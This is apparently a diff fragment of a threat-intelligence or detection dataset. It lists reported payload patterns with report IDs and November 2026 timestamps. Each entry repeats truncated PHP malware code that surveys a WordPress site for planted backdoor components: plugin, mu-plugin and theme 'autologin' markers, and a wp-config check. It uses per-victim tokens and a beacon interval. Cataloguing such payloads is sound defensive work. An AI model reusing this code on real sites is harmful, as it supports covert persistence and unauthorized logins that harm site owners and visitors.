+    "Pattern": "$tok='Dg0mOZXbRsMbRnIM8aXPYlO_1EaBUtucs7yEA9bacyM';$id='c9fe0201b094be2a';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T12:06:21.819000+00:00",
+    "LastSeen": "2026-11-11T12:06:21.819000+00:00",
+    "ReportIds": [
+      "cmwc2pdk2044a0omlbicfkxvn"
+    ],
+    "PayloadExamples": [
+      "$tok='Dg0mOZXbRsMbRnIM8aXPYlO_1EaBUtucs7yEA9bacyM';$id='c9fe0201b094be2a';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='Fpz4B8RWEqcaq72oz6YgtIiyLmu6Frhj_EeU6Fc4hNg';$id='f6c8ccdc514dfe42';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-12T06:27:02.161000+00:00",
+    "LastSeen": "2026-11-12T06:27:02.161000+00:00",
+    "ReportIds": [
+      "cmwd60uht01qs0omlppp8dmai"
+    ],
+    "PayloadExamples": [
+      "$tok='Fpz4B8RWEqcaq72oz6YgtIiyLmu6Frhj_EeU6Fc4hNg';$id='f6c8ccdc514dfe42';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='IGFNgauuVOmb200hsic7HDDDuL-YcXBx_DcbnEG5eLg';$id='5b69edd2593c861c';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T06:38:55.910000+00:00",
+    "LastSeen": "2026-11-09T06:38:55.910000+00:00",
+    "ReportIds": [
+      "cmw8w4l7q272s0omlavb907i1"
+    ],
+    "PayloadExamples": [
+      "$tok='IGFNgauuVOmb200hsic7HDDDuL-YcXBx_DcbnEG5eLg';$id='5b69edd2593c861c';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='ItnggAAsB5qwM28Gu-ICcYNuXGF525aEsxY6KXqxDsw';$id='55579f89b4acf055';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-09T07:34:29.507000+00:00",
+    "LastSeen": "2026-11-09T07:34:29.507000+00:00",
+    "ReportIds": [
+      "cmw8y41h82asd0omldlecn1c5"
+    ],
+    "PayloadExamples": [
+      "$tok='ItnggAAsB5qwM28Gu-ICcYNuXGF525aEsxY6KXqxDsw';$id='55579f89b4acf055';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='N2IoT5C2CzQppBecp28PWlS7ypL0l-ives--aDT27qI';$id='611ebe8fe0e7b6c7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T02:47:55.154000+00:00",
+    "LastSeen": "2026-11-11T02:47:55.154000+00:00",
+    "ReportIds": [
+      "cmwbir7jv08hc0nmltai47izd"
+    ],
+    "PayloadExamples": [
+      "$tok='N2IoT5C2CzQppBecp28PWlS7ypL0l-ives--aDT27qI';$id='611ebe8fe0e7b6c7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='TbchK47nH93fyRUgujJTEerB8tBEPjlqZlswl6UqhGg';$id='17c124bf09bf24b7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-11T09:37:52.618000+00:00",
+    "LastSeen": "2026-11-11T09:37:52.618000+00:00",
+    "ReportIds": [
+      "cmwbxef4t01pt0omln3m7kdez"
+    ],
+    "PayloadExamples": [
+      "$tok='TbchK47nH93fyRUgujJTEerB8tBEPjlqZlswl6UqhGg';$id='17c124bf09bf24b7';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&("
+    ]
+  },
+  {
+    "Pattern": "$tok='WxWgNxe4D0-f5PrfHaxy8wunZc30NGqCe7e7DdFf0U8';$id='58ae9ac66a26ad8e';$interval=420; function _ea_inv($cfg){ $r=array('ts'=>time(),'wp'=>(function_exists('get_bloginfo')?get_bloginfo('version'):''),'php'=>PHP_VERSION); $chk=function($p,$m){$o=array('path'=>$p,'exists'=>false,'marker'=>false,'size'=>0);if(!$p||!is_string($p))return $o; if(@is_file($p)){$b=@file_get_contents($p);$o['exists']=true;$o['size']=strlen((string)$b);$o['marker']=($b&&strpos($b,$m)!==false);}return $o;}; $r['stub']=$chk($cfg['stub'],$cfg['ctrl']); $vis=array('plugin'=>null,'paths'=>array()); foreach($cfg['vis_paths'] as $_vp){$vis['paths'][]=$chk($_vp,$cfg['vis']);} $found=null;foreach($vis['paths'] as $_p){if(!empty($_p['marker'])){$found=$_p;break;}} if(!$found){$pd=WP_CONTENT_DIR.'/plugins';if(@is_dir($pd)){foreach(@glob($pd.'/*/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_plug')!==false){$found=$chk($_f,'// ea_plug');break;}}} $vis['plugin']=$found?:array('path'=>'','exists'=>false,'marker'=>false); $r['visitor']=$vis; $mu=array('path'=>'','exists'=>false,'marker'=>false);$md=WP_CONTENT_DIR.'/mu-plugins'; if(@is_dir($md)){foreach(@glob($md.'/*.php')?:array() as $_f){$b=@file_get_contents($_f);if($b&&strpos($b,'// ea_mu')!==false){$mu=$chk($_f,'// ea_mu');break;}}} $r['mu_autologin']=$mu; $ft=0;$fw=0;$td=WP_CONTENT_DIR.'/themes';if(@is_dir($td)){foreach(@glob($td.'/*/functions.php')?:array() as $_f){$ft++;$b=@file_get_contents($_f);if($b&&strpos($b,'// _ea_al')!==false)$fw++;}} $r['functions_autologin']=array('themes_total'=>$ft,'themes_with_marker'=>$fw); $wpc=array('path'=>(defined('ABSPATH')?ABSPATH.'wp-config.php':''),'exists'=>false,'marker'=>false); if($wpc['path']&&@is_file($wpc['path'])){$b=@file_get_contents($wpc['path']);$wpc['exists']=true;$wpc['marker']=($b&&(",
+    "DistinctPayloadCount": 1,
+    "ReportCount": 1,
+    "FirstSeen": "2026-11-10T15:04:27.972000+00:00",
+    "LastSeen": "2026-11-10T15:04:27.972000+00:00",
+    "ReportIds": [
+      "cmwatmk9j042v0oml5p2hxaki"
+    ],
+    "PayloadExamples": [
